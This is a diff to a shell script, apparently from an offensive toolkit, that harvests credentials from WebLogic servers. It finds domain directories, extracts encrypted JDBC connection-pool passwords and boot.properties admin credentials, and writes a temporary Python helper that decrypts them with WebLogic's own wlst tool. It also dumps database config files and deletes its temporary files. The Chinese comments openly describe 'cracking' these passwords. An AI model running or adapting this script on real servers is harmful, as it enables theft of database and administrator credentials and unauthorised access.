@@ -3,18 +3,30 @@
 # https://github.com/hktalent/myhktools 
 echo "查找数据库连接"
 netstat -antp|grep ":1521"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):1521"|sort -u
-
+netstat -antp|grep ":3306"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):3306"|sort -u
 # doman
-sdomain=`ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|sort -u|sed 's/_domain.*$/_domain/g'`
+sdomain=`ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|sort -u`
+
+if [ "${sdomain}" = "" ];
+then
+  tmp=`ps -ef|grep java|grep -Eo "(home=[^ ]+)"|sed  's/home=//g'|sed 's/\/wlserver.*$//g'|sort -u|head -n 1`;
+  sdomain=`find ${tmp} -type d -name "domains"|grep 'user_projects'`
+  wlst=`find ${tmp} -type f -name "wlst.*"|sort -u`
+fi
+
 # 精准找到wlst.*， 用于破解jdbc连接池密码
-wlst=`ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|sed 's/user_projects//g'|xargs -I {}  find {} -type f -name "wlst.*"|sort -u`
-echo "domain dir: ${sdomain}"
+if [ "${wlst}" = "" ];
+then
+  wlst=`ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|sed 's/user_projects//g'|xargs -I {}  find {} -type f -name "wlst.*"|sort -u`
+fi
+
+echo "wlst= ${wlst}"
+echo "sdomain = ${sdomain}"
 
 # 获得连接池配置密码加密串
 echo "连接池信息"
-ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|sed 's/user_projects//g'|xargs -I {}  find {} -type f -name "*jdbc*.xml"|xargs -I {} cat {}| grep -B 10 "<password-encrypted>"
-
-enPswd=`ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|sed 's/user_projects//g'|xargs -I {}  find {} -type f -name "*jdbc*.xml"|xargs -I {} cat {}|grep -Eo "<password-encrypted>([^<]+)<\/password-encrypted>"|sort -u|sed -E 's/<[^<>]+?>//g'`
+find ${sdomain} -type f -name "*jdbc*.xml"|xargs -I {} cat {}| grep -B 10 "<password-encrypted>"
+enPswd=`find ${sdomain} -type f -name "*jdbc*.xml"|xargs -I {} cat {}|grep -Eo "<password-encrypted>([^<]+)<\/password-encrypted>"|sort -u|sed -E 's/<[^<>]+?>//g'`
 echo "jdbc pool pswd: ${enPswd}"
 # 获取破解后的密码
 tmpFl=`mktemp`
@@ -49,6 +61,7 @@ ${wlst}  ${tmpFl}  ${sdomain} "${enPswd}"
 # 搜索weblogic console admin用户名及密码
 export DOMAIN_HOME=${sdomain}
 cd $DOMAIN_HOME/security
+cd $DOMAIN_HOME/*_domain/security
 echo "所有weblogic console 用户名及密码"
 find $DOMAIN_HOME/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"
 cat <<EOT>./xxx.py
@@ -68,14 +81,12 @@ for i in range(1, len(sys.argv)):
 
 EOT
 echo "开始破解weblogic console 用户名及密码"
-find $DOMAIN_HOME/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"|xargs ${wlst} ./xxx.py
-rm -rf $DOMAIN_HOME/security/xxx.py
+find ${sdomain} -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"|xargs ${wlst} ./xxx.py
+rm -rf ./xxx.py
 
 # 获取jdbc配置信息
 echo "all jdbc.properties:"
-ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|xargs -I {} find {} -type f -name "*jdbc*.properties"|xargs -I {} cat {} |grep -Ev "^#|^\s*$"
-# echo "输出所有jdbc连接池配置信息"
-# ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|sed 's/user_projects//g'|xargs -I {}  find {} -type f -name "*jdbc*.xml"|sort -u|xargs -I {} cat {}
+find ${sdomain} -type f -name "*jdbc*.properties"|xargs -I {} cat {} |grep -Ev "^#|^\s*$"
 
 rm /tmp/myX.sh
 rm ${tmpFl}
